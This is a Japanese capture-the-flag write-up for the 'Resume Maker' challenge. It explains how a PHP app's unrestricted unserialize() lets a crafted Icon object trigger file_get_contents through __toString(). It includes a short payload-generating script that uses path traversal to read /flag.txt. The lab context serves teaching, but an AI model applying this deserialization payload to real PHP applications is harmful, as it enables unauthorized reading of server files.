# Resume Maker

https://alpacahack.com/daily-bside/challenges/resume-maker

## 問題の概要

次のような PHP サーバーが動いています。

- フォームにユーザー情報を入力して送信すると `base64_encode(serialize($user))` でシリアライズされたユーザー情報が表示される
- フォームにシリアライズされたユーザー情報を入力して送信すると、サーバーは `unserialize(base64_decode($input))` でデコードされたユーザー情報を表示する

`unserialize` させるオブジェクトを工夫して `/flag.txt` の内容を表示させる問題です。

## 解法

`unserialize` は `options` で `allowed_classes` を指定していない場合、実行されるコンテキストから参照できる任意のクラスのオブジェクトを復元することができます。

ファイルを読み込む操作を行うところがないか探してみると、`Icon.__toString()` メソッドで `file_get_contents` を呼び出していることがわかります。

```php
class Icon {
  public $path;
      public function __toString(): string
    {
        $contents = file_get_contents(__DIR__ . $this->path);
        if ($contents === false) {
            return '';
        }
        return 'data:image/png;base64,' . base64_encode($contents);
    }
}
```

`$user->name` に `Icon` クラスのオブジェクトを入れれば、`h($user->name)` の呼び出し時に `__toString()` が呼び出されて `/flag.txt` の内容を読み取ることができます。

```php
function h($value): string
{
    return htmlspecialchars((string) $value, ENT_QUOTES, 'UTF-8');
}
```

サーバーのソースコードの `Icon` クラスと `User` クラスの定義を使用し、以下のようなコードでシリアライズされた文字列を生成できます。

```php
<?php
$icon = new Icon('A');
$icon->path = "/../../../flag.txt";

$user = new User(["name"=> $icon]);

$serialized = serialize($user);
$str = base64_encode($serialized);

print $str . "\n";
```

この文字列をフォームに入力して送信すると、Base64でエンコードされた `/flag.txt` の内容が表示されます。
